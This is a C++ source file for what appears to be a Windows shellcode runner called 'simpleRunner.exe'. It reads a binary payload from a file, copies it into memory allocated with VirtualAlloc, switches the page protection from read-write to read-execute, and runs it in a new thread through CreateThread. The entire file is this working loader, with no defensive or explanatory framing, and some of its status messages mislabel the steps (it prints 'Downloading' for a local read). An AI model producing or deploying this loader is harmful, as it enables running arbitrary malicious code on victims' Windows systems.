#include <Windows.h>
#include <cstddef>
#include <iostream>
#include <fstream>
#include <processthreadsapi.h>
#include <vector>
#include <iterator>
#include <winnt.h>

std::vector<BYTE> ReadPayload(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return {};
    return std::vector<BYTE>(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );
}

LPVOID AllocateAndCopyPayload(const std::vector<BYTE>& payload, DWORD& oldProtect) {
    LPVOID execMem = VirtualAlloc(
        NULL,                          
        payload.size(),                                
        MEM_COMMIT | MEM_RESERVE,           
        PAGE_READWRITE                             
    );
    if (execMem == NULL) return NULL;

    VirtualProtect(execMem, payload.size(), PAGE_READWRITE, &oldProtect);
    memcpy(execMem, payload.data(), payload.size());
    return execMem;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: simpleRunner.exe <payload.bin>\n";
        return 1;
    }

    std::vector<BYTE> payload = ReadPayload(argv[1]);
    if (payload.empty()) {
        std::cerr << "[-] Failed to read payload\n";
        return 1;
    }
    std::cout << "[+] Step 1: Downloading payload\n";
    std::cout << "[+] Downloaded " << payload.size() << " bytes\n";
    std::cout << "[+] Step 2: Allocating memory (RWX)\n";
    DWORD oldProtect;
    LPVOID execMem = AllocateAndCopyPayload(payload, oldProtect);
    if (!execMem) {
        std::cerr << "[-] Memory allocation failed\n";
        return 1;
    }
    std::cout << "[+] Payload allocated at: " << std::hex << execMem << "\n";
    std::cout << "[+] Step 3: RW -> RX\n";
    VirtualProtect(execMem, payload.size(), PAGE_EXECUTE_READ, &oldProtect);
    std::cout << "[+] Step 3: Executing via CreateThread\n";
    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)execMem,
        NULL, 0,
        &threadId
    );
    if (!hThread) {
        std::cerr << "[-] CreateThread failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Thread created (ID: " << threadId << ")\n";

    // Wait for execution to complete and clean up
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    

    return 0;
}